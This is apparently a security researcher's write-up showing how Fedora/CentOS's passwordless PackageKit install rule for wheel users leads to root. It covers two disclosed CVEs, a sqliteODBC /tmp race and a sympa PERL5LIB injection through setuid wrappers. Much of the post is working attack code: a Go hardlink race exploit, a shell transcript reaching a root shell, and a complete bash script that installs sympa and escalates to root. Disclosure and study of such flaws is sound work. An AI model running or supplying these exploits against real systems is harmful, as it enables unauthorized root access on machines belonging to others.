# Abusing PackageKit on Fedora/CentOS for fun & profit (from wheel to root).

## What is PackageKit ?

PackageKit is a system available and installed by default in most distributions that allows installing or updating applications without using a specific packet manager (like DNF, Yum or Aptitude).

It works as a system daemon, *packagekitd*, and communicates with other software using *DBus*.

## The default behavior on Fedora/CentOS using Gnome

By default, when installing Fedora Workstation or CentOS with Gnome, users in the *wheel* group are allowed to install packets using PackageKit without authentication.

You may already have run a command on your system, and the prompt asked you if you want to install the software that provides this command: this is handled by PackageKit.

You can use the *pkcon* tool to manually install a packet, without the need of entering your password:

`pkcon install lynx`

### Where is this configured?

The PackageKit policy is handled by *Polkit*, which allows low privileged applications to interact with privileged system applications.

The configuration file could be found, by default, in the `/usr/share/polkit-1/actions/org.freedesktop.packagekit.policy` file (available online here : https://github.com/hughsie/PackageKit/blob/master/policy/org.freedesktop.packagekit.policy.in ).

In the configuration file, you can see that most Polkit actions requires `auth_admin` or `auth_admin_keep`, meaning with a password.
Some actions do not require authentication, like system update or configuration of the network proxy.

However, if we look at the `org.freedesktop.packagekit.package-install` policy, we can see that this policy *requires* a password authentication:

```xml
    <defaults>
      <allow_any>auth_admin</allow_any>
      <allow_inactive>auth_admin</allow_inactive>
      <allow_active>auth_admin_keep</allow_active>
    </defaults>
```

But why can we install packets without authentication?

This behavior is controlled by Polkit *rules*. If we take a look at the `/usr/share/polkit-1/rules.d/org.freedesktop.packagekit.rules` file, we can see the following content:

```
polkit.addRule(function(action, subject) {
    if (action.id == "org.freedesktop.packagekit.package-install" &&
        subject.active == true && subject.local == true &&
        subject.isInGroup("wheel")) {
            return polkit.Result.YES;
    }
});
```

This rule allows every user from the *wheel* group to call the `org.freedesktop.packagekit.package-install` without authentication.

## Why you should not let users install packets without authentication: from PackageKit on Fedora to root

We decided to see if there is a security risk of allowing users to install packets without authentication.

In the `org.freedesktop.packagekit.policy` file, we can read the following for the `package-install` action:

```xml
    <!-- SECURITY:
          - Normal users do not need authentication to install signed packages
            from signed repositories, as this cannot exploit a system.
          - Paranoid users (or parents!) can change this to 'auth_admin' or
            'auth_admin_keep'.
     -->
```

> *As this cannot exploit a system*?

Let's verify that...

In order to perform our research, we downloaded **every single packet** from the Fedora repository.

The first thing we decided to take a look at are the installation scripts.

These scripts are *bash* scripts that are run before and/or after installation (pre/post).

We searched for a few sensitive keywords that may allow us to escalate our privileges or perform naughty things, and we found several scripts that uses `/tmp` or `mktemp`.

### Abusing sqliteODBC (CVE-2020-12050)

The sqliteODBC package saves a part of his configuration file in the `/tmp` folder, before running the `odbcinstall` script on it.

Here is the RPM install script:

```
/sbin/ldconfig
if [ -x /usr/bin/odbcinst ] ; then
	INST=/tmp/sqliteodbcinst$$

	if [ -r /usr/lib64/libsqliteodbc.so ] ; then
		cat > $INST <<- 'EOD'
			[SQLITE]
			Description=SQLite ODBC 2.X
			Driver=/usr/lib64/libsqliteodbc.so
			Setup=/usr/lib64/libsqliteodbc.so
			Threading=2
			FileUsage=1
		EOD

		/usr/bin/odbcinst -q -d -n SQLITE | grep '^\[SQLITE\]' >/dev/null || {
			/usr/bin/odbcinst -i -d -n SQLITE -f $INST || true
		}

		cat > $INST <<- 'EOD'
			[SQLite Datasource]
			Driver=SQLITE
		EOD

		/usr/bin/odbcinst -q -s -n "SQLite Datasource" | \
		grep '^\[SQLite Datasource\]' >/dev/null || {
			/usr/bin/odbcinst -i -l -s -n "SQLite Datasource" -f $INST || true
		}
	fi
[...]
```

As you can see, the temporary configuration file is saved using the following name `/tmp/sqliteodbc$$` (where $$ is the PID of the process).

As the configuration file is using a predictable name, we can try to perform a race in order to write new contents before the file is loaded by `odbcinstall`.

The PID of a process is incremental, so we just have to pre-create a bunch of *symlinks* in the `/tmp` directory that target our payload.

We first mounted a filesystem as read-only, and placed our payload in this filesystem. This way, if the installer tries to change the file content, it will fail.

However, here's the issue:

Modern kernels have implemented a security mechanism, `fs.protected_symlinks`, that disallow following symlinks to other users, when placed in world-writable directories (like /tmp):

```
$ ln -s /etc/passwd /tmp/hello
$ sudo cat /tmp/hello
cat: /tmp/hello: Permission denied
```

So we could not use *symlinks* to perform this attack. However, we managed to bypass this security mechanism by using *hardlinks*.

*Hardlinks* consist in just an "alternate" name for the file. Unlike symlinks, they only work from the same filesystem they were created on, so our "read-only" filesystem trick would not work.

However, we could always attempt to win the race against the installer process, and override the file content. We created the following Golang exploit code, that works nearly all the time.

```go
package main

import (
	"fmt"
	"os"
)

func SpreadHardlinks(pid int) {
	maxPid := pid + 100
	fmt.Println("[+] Creating hardlinks...")
	for pid++ ; pid < maxPid; pid++ {
		target := fmt.Sprintf("/tmp/sqliteodbcinst%d", pid)
		err := os.Link("/tmp/race.ini", target)
		if err != nil {
			panic(err)
		}
		fmt.Printf("[~] Created hardlink : %s\n", target)
	}
}

func main(){
	const poc = `
[default]
Description=XYZ ODBC
Driver=/tmp/poc.so
Driver64=/tmp/poc.so
Setup=/tmp/poc.so
Setup64=/tmp/poc.so
Threading=2
FileUsage=1
`
	pid := os.Getpid()
	fmt.Printf("[~] Current pid : %d\n", pid)

	fmt.Println("[+] Attempting to win the race, watch for changes in /etc/odbcinstall.conf !")

	f, err := os.OpenFile("/tmp/race.ini", os.O_CREATE | os.O_RDWR, 0700)
	if err != nil {
		panic(err)
	}
	SpreadHardlinks(pid)

	for {
		f.Seek(0, 0)
		f.WriteString(poc)
		f.Sync()
	}

	f.Close()
}
```

That way, every time a program tries to use unixODBC, the `/tmp/poc.so` library will be loaded.

However, we did not find any program or service that could use unixODBC during the installation process. This vulnerability could still be used to escalate privileges if some services or web applications use ODBC as this will load the `/tmp/poc.so` dynamic library.

### Abusing sympa (CVE-2020-10936)

After evaluating the security of some install scripts, we decided to extract every RPM and search for *SUID* binaries.

After a quick search, we focused on the `/usr/libexec/sympa/` directory, that contains multiple *suid* binaries:

```
[XYZ@localhost ~]$ ls -lah /usr/libexec/sympa/
[...]
-rwsr-xr-x.  1 sympa sympa  16K 23 janv. 09:46 bouncequeue
-rwsr-xr-x.  1 sympa sympa  16K 23 janv. 09:46 familyqueue
-rwsr-xr-x.  1 sympa sympa  16K 23 janv. 09:46 queue
-rwsr-x---.  1 root  sympa  16K 23 janv. 09:46 sympa_newaliases-wrapper
-rwsr-sr-x.  1 sympa sympa  16K 23 janv. 09:46 sympa_soap_server-wrapper.fcgi
-rwsr-sr-x.  1 sympa sympa  16K 23 janv. 09:46 wwsympa-wrapper.fcgi
```

As you can see, only the `sympa_newaliases-wrapper` binary is *suid root*. However, this binary is not world-executable. Only users from the *sympa* group are allowed to execute this program, and this is not our case.

So, in order to be able to execute this program, we need to perform a privileges escalation to the *sympa* user.

We looked at the `wwsympa-wrapper.fcgi` *setuid/setgid sympa* binary for vulnerabilities. We simply downloaded the RPM source using `dnf download --source sympa`, extracted some TARs, and looked at the C source code (that, honestly, looks like a CTF challenge):

```c
#include <unistd.h>

int main(int argn, char **argv, char **envp) {
    setreuid(geteuid(),geteuid()); // Added to fix the segfault
    setregid(getegid(),getegid()); // Added to fix the segfault
    argv[0] = WWSYMPA;
    return execve(WWSYMPA,argv,envp);
}
```

The program simply execute the *WWSYMPA* binary : `wwsympa.fcgi` as the *sympa* user and group. However, something is very interesting here : *envp* is passed to this binary!

This means that every environment variable defined when running the `wwsympa-wrapper.fcgi` is passed to `wwsympa.fcgi`.

Let's take a look at `wwsympa.fcgi`:

```
$ head wwsympa.fcgi.in 
#!--PERL--
# -*- indent-tabs-mode: nil; -*-
# vim:ft=perl:et:sw=4
# $Id$
[...]
```

That's a Perl script! And, luckily for us, the PERL interpreter looks at the `PERLLIB` and `PERL5LIB` environment variables to look for Perl modules.

So, if we can create a malicious Perl module, the PERL interpreter will check the PERLLIB and PERL5LIB path, and if a module name matches, it will load it. 

We came up with the following PoC that allows us to escalate our privileges as *sympa*, by creating a malicious *Config* perl module:

```
$ id
uid=1000(xyz) gid=1000(xyz) groupes=1000(xyz),10(wheel) contexte=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
$ mkdir /tmp/poc
$ echo 'exec("/bin/bash");' > /tmp/poc/Config.pm
$ PERL5LIB=/tmp/poc PERLLIB=/tmp/poc /usr/libexec/sympa/wwsympa-wrapper.fcgi
bash-5.0$ id
uid=977(sympa) gid=975(sympa) groupes=975(sympa),10(wheel),1000(xyz) contexte=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

As we are now the *sympa* user, we are allowed to execute the `sympa_newaliases-wrapper` binary. Let's take a look at the source code:

```c
#include <unistd.h>

int main(int argn, char **argv, char **envp) {
    setreuid(geteuid(),geteuid());
    setregid(getegid(),getegid());
    argv[0] = SYMPA_NEWALIASES;
    return execve(SYMPA_NEWALIASES, argv, envp);
}
```

Looks familiar, isn't it ? `SYMPA_NEWALIASES` point to `sympa_newaliases.pl`, which is also a *Perl* script!

Let's try the exact same POC, but with the privileges of the *sympa* user.

```
bash-5.0$ id
uid=977(sympa) gid=975(sympa) groupes=975(sympa),10(wheel),1000(xyz) contexte=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
bash-5.0$ echo $PERLLIB
/tmp/poc
bash-5.0$ echo $PERL5LIB
/tmp/poc
bash-5.0$ /usr/libexec/sympa/sympa_newaliases-wrapper
[root@localhost poc]# id
uid=0(root) gid=975(sympa) groupes=975(sympa),10(wheel),1000(xyz) contexte=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@localhost poc]# whoami
root
```

## Gluing it all together

Here's a complete exploit that installs *sympa* using PackageKit, and then performs a privilege escalation to *root*.

```bash
#!/bin/sh
echo "[+] This exploit will give you a root shell on CentOS/RHEL/Fedora."
echo "[~] Installing sympa using PackageKit..."
pkcon refresh && pkcon install sympa -y
echo "[~] Exploit setup."
EXPLOITDIR=$(mktemp -d)
EXPLOITFILE="$EXPLOITDIR/Config.pm"
chmod 777 $EXPLOITDIR
cat > $EXPLOITFILE <<"EOL"
my $sympauser = "sympa";
my $pwuid = getpwuid( $< );
$elevate = $pwuid eq $sympauser;
$root = $pwuid eq "root";
if ($elevate == 1)
{
    print "[+] Running as service user, elevating privileges as root...\n";
    exec("/usr/libexec/sympa/sympa_newaliases-wrapper");
}
else {
    if ($root == 1)
    {
        print "[+] Running as root, popping shell.\n";
        exec("/bin/sh");
    }
    else
    {
        print "[!] Not running as root/sympa, exploit failed.\n";
    }
}
EOL
export PERLLIB=$EXPLOITDIR
export PERL5LIB=$EXPLOITDIR
export SYMPALIB=$EXPLOITDIR
echo "[+] Triggering exploit."
/usr/libexec/sympa/wwsympa-wrapper.fcgi
```

## Conclusion

Allowing users to install packets without authentication is definitely *dangerous*.

Indeed, because packets contains vulnerabilities, this could be abused in order to gain *root* access, without a password. It is a little bit like if  `sudo` were configured to not ask for a password before running commands.

In order to disallow this behavior, change the default configuration in the `/usr/share/polkit-1/rules.d/org.freedesktop.packagekit.rules` file.

Also, if you are using Sympa, make sure you use the latest version available.




